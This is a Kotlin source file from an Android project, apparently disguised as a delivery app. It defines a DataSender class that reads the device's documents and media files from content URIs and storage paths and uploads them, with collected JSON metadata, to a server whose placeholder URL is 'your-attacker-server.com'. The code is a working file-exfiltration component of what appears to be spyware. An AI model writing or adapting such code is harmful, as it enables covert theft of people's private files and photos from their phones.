package com.baro.baro_baedal.modules

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream

/**
 * 수집된 데이터를 서버로 전송하는 클래스
 * Multipart/form-data를 사용하여 JSON 메타데이터와 파일들을 함께 전송합니다.
 * 
 * Spring 서버에서 받는 방법:
 * ```java
 * @PostMapping("/api/collect")
 * public ResponseEntity<?> collectData(
 *     @RequestPart("data") String jsonData,
 *     @RequestPart("files") MultipartFile[] files
 * ) {
 *     // jsonData는 JSON 문자열
 *     // files는 첨부된 파일들
 * }
 * ```
 */
class DataSender(
    private val context: Context,
    private val serverUrl: String,
    private val enableLogging: Boolean = true
) {
    
    private val client = OkHttpClient()
    
    /**
     * JSON 데이터와 파일들을 multipart/form-data로 서버에 전송합니다.
     * 
     * @param jsonData 전송할 JSON 문자열 (메타데이터)
     * @param documents 문서 파일 리스트
     * @param mediaFiles 미디어 파일 리스트
     */
    suspend fun send(
        jsonData: String,
        documents: List<DocumentInfo>,
        mediaFiles: List<MediaFileInfo>
    ) = withContext(Dispatchers.IO) {
        try {
            // 서버 URL이 기본값이면 전송하지 않음
            if (serverUrl == "http://your-attacker-server.com/api/collect") {
                if (enableLogging) {
                    Log.w("DataSender", "Server URL not configured. Skipping upload.")
                }
                return@withContext
            }
            
            // MultipartBody.Builder 생성
            val multipartBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
            
            // 1. JSON 메타데이터를 "data" 필드로 추가
            multipartBuilder.addFormDataPart(
                "data",
                null,
                jsonData.toRequestBody("application/json".toMediaType())
            )
            
            if (enableLogging) {
                Log.d("DataSender", "Adding JSON metadata to multipart...")
            }
            
            // 2. 문서 파일들을 "files" 필드로 추가
            documents.forEach { document ->
                try {
                    val fileBody = readFileFromUri(document.path, document.name, document.mimeType)
                    if (fileBody != null) {
                        multipartBuilder.addFormDataPart(
                            "files",
                            document.name,
                            fileBody
                        )
                        if (enableLogging) {
                            Log.d("DataSender", "Added document file: ${document.name} (${document.size} bytes)")
                        }
                    }
                } catch (e: Exception) {
                    if (enableLogging) {
                        Log.w("DataSender", "Failed to add document file: ${document.name}", e)
                    }
                }
            }
            
            // 3. 미디어 파일들을 "files" 필드로 추가
            mediaFiles.forEach { mediaFile ->
                try {
                    val fileBody = readFileFromUri(mediaFile.path, mediaFile.name, mediaFile.mimeType)
                    if (fileBody != null) {
                        multipartBuilder.addFormDataPart(
                            "files",
                            mediaFile.name,
                            fileBody
                        )
                        if (enableLogging) {
                            Log.d("DataSender", "Added media file: ${mediaFile.name} (${mediaFile.size} bytes)")
                        }
                    }
                } catch (e: Exception) {
                    if (enableLogging) {
                        Log.w("DataSender", "Failed to add media file: ${mediaFile.name}", e)
                    }
                }
            }
            
            // MultipartBody 생성
            val requestBody = multipartBuilder.build()
            
            // HTTP POST 요청 생성
            val request = Request.Builder()
                .url(serverUrl)
                .post(requestBody)
                .build()
            
            if (enableLogging) {
                Log.d("DataSender", "Sending multipart request with ${documents.size} documents and ${mediaFiles.size} media files...")
            }
            
            // 요청 실행
            val response = client.newCall(request).execute()
            
            if (enableLogging) {
                Log.d("DataSender", "Server response: ${response.code} - ${response.message}")
                if (response.body != null) {
                    val responseBody = response.body!!.string()
                    Log.d("DataSender", "Response body: $responseBody")
                }
            }
            
            response.close()
        } catch (e: Exception) {
            if (enableLogging) {
                Log.e("DataSender", "Error sending data to server", e)
            }
            e.printStackTrace()
        }
    }
    
    /**
     * URI 또는 파일 경로에서 파일을 읽어서 RequestBody로 변환합니다.
     * 
     * @param uriString 파일 URI (content://) 또는 파일 경로 (/storage/emulated/0/...)
     * @param fileName 파일 이름
     * @param mimeType MIME 타입
     * @return RequestBody 또는 null (읽기 실패 시)
     */
    private fun readFileFromUri(uriString: String, fileName: String, mimeType: String): okhttp3.RequestBody? {
        return try {
            val contentResolver: ContentResolver = context.contentResolver
            val tempFile = File(context.cacheDir, "upload_${System.currentTimeMillis()}_$fileName")
            
            // content:// URI인지 확인
            if (uriString.startsWith("content://")) {
                // Content URI인 경우
                val uri = Uri.parse(uriString)
                contentResolver.openInputStream(uri)?.use { inputStream ->
                    FileOutputStream(tempFile).use { outputStream ->
                        inputStream.copyTo(outputStream)
                    }
                } ?: run {
                    if (enableLogging) {
                        Log.w("DataSender", "Cannot open InputStream from content URI: $uriString")
                    }
                    return null
                }
            } else {
                // 파일 경로 문자열인 경우 (예: /storage/emulated/0/Download/...)
                val file = File(uriString)
                if (file.exists() && file.isFile) {
                    file.copyTo(tempFile, overwrite = true)
                } else {
                    if (enableLogging) {
                        Log.w("DataSender", "File does not exist: $uriString")
                    }
                    return null
                }
            }
            
            // MIME 타입 결정
            val mediaType = if (mimeType.isNotEmpty()) {
                mimeType.toMediaType()
            } else {
                "application/octet-stream".toMediaType()
            }
            
            // RequestBody 생성
            val requestBody = tempFile.asRequestBody(mediaType)
            
            if (enableLogging) {
                Log.d("DataSender", "Successfully read file: $fileName (${tempFile.length()} bytes)")
            }
            
            // 전송 후 임시 파일 삭제 (비동기)
            tempFile.deleteOnExit()
            
            requestBody
        } catch (e: Exception) {
            if (enableLogging) {
                Log.e("DataSender", "Error reading file from URI/path: $uriString", e)
            }
            null
        }
    }
}

